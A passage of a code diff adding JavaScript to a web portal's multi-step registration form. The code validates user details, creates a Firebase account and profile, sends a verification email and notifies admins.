+            if(!tc) { document.getElementById('err-terms').classList.add('show'); ok = false; }
+            if(ok) { saveRegStep({fullName:fn, email:em, username:un}); curIdx = 1; updateUI(); }
+        };
+
+        document.getElementById('btnStep2').onclick = () => {
+            const ph = document.getElementById('phoneNumber').value.trim();
+            const dob = document.getElementById('dob').value;
+            const gen = document.getElementById('gender').value;
+            let ok = true;
+            if(ph.length < 7) { document.getElementById('err-phoneNumber').classList.add('show'); ok = false; }
+            if(!gen) { document.getElementById('err-gender').classList.add('show'); ok = false; }
+            const age = Math.floor((new Date() - new Date(dob)) / 31557600000);
+            if(!dob || age < 18) { document.getElementById('err-dob').classList.add('show'); ok = false; }
+            if(ok) { curIdx = 2; updateUI(); }
+        };
+
+        document.getElementById('btnBack1').onclick = () => { curIdx = 0; updateUI(); };
+        document.getElementById('btnBack2').onclick = () => { curIdx = 1; updateUI(); };
+        document.getElementById('refToggle').onclick = () => {
+            const b = document.getElementById('refBox');
+            const t = document.getElementById('refToggle');
+            const isShow = b.classList.toggle('show');
+            t.innerHTML = isShow ? '<i class="fa-solid fa-minus"></i> Remove referral code' : '<i class="fa-solid fa-plus"></i> Have a referral code?';
+        };
+
+        document.getElementById('regForm').onsubmit = async (e) => {
+            e.preventDefault();
+            const btn = document.getElementById('btnSubmit');
+            setButtonLoading(btn, true, 'Creating Secure Identity...');
+            const data = {
+                fullName: document.getElementById('fullName').value.trim(),
+                email: document.getElementById('email').value.trim(),
+                username: document.getElementById('username').value.trim(),
+                password: passIn.value,
+                phoneNumber: '+1' + document.getElementById('phoneNumber').value.trim(),
+                country: document.getElementById('country').value,
+                gender: document.getElementById('gender').value,
+                dob: document.getElementById('dob').value,
+                referredBy: document.getElementById('referredBy').value.trim()
+            };
+            try {
+                const cred = await createUserWithEmailAndPassword(auth, data.email, data.password);
+                await updateProfile(cred.user, { displayName: data.fullName });
+                const payload = buildNewUserPayload({ ...data, uid: cred.user.uid });
+                await setDoc(doc(db, "users", cred.user.uid), payload);
+                await sendEmailVerification(cred.user);
+                await notifyAdmins({ title: 'New Federal Enrollment', message: `${data.fullName} has registered a new portal account.`, type: 'info', link: 'admin-portal.html' });
+                clearRegData();
+                window.location.href = 'verify.html';
+            } catch (err) {
+                showToast(err.message, 'error');
+                setButtonLoading(btn, false);
+            }
+        };
+    </script>
 </body>
 </html>
